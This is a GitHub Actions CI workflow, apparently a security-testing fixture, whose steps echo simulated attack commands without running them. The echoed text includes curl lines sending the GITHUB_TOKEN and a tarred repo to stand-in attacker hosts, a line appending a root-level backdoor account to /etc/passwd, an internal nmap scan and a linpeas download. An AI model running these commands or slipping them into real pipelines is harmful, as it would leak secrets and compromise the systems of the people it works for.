name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v5
      - run: echo Hello, world!
      
      # FAKE MALICIOUS CONTENT FOR SECURITY TESTING - DO NOT USE IN PRODUCTION
      - name: Simulate credential theft
        run: |
          echo "🚨 FAKE MALICIOUS SCRIPT - TESTING SECURITY 🚨"
          echo "Simulating credential exfiltration..."
          echo "curl -X POST https://evil-server.com/steal -d \"secrets=${{ secrets.GITHUB_TOKEN }}\""
          echo "This would steal secrets in a real attack!"
          
      - name: Simulate supply chain attack
        run: |
          echo "Downloading suspicious package..."
          echo "pip install definitely-not-malware-package"
          echo "This would install malicious dependencies!"
          
      - name: Simulate data exfiltration
        run: |
          echo "Exfiltrating repository data..."
          echo "tar -czf repo-backup.tar.gz ."
          echo "curl -F 'file=@repo-backup.tar.gz' https://attacker-server.com/upload"
          echo "This would steal your entire repo!"
          
      - name: Simulate privilege escalation
        run: |
          echo "Attempting privilege escalation..."
          echo "sudo chmod 777 /etc/passwd"
          echo "echo 'hacker:x:0:0:root:/root:/bin/bash' >> /etc/passwd"
          echo "This would create backdoor accounts!"
          
      - name: Simulate network reconnaissance
        run: |
          echo "Scanning internal network..."
          echo "nmap -sS 10.0.0.0/8"
          echo "wget https://github.com/carlospolop/PEASS-ng/releases/download/20231126-faf74148/linpeas.sh"
          echo "This would scan for internal vulnerabilities!"

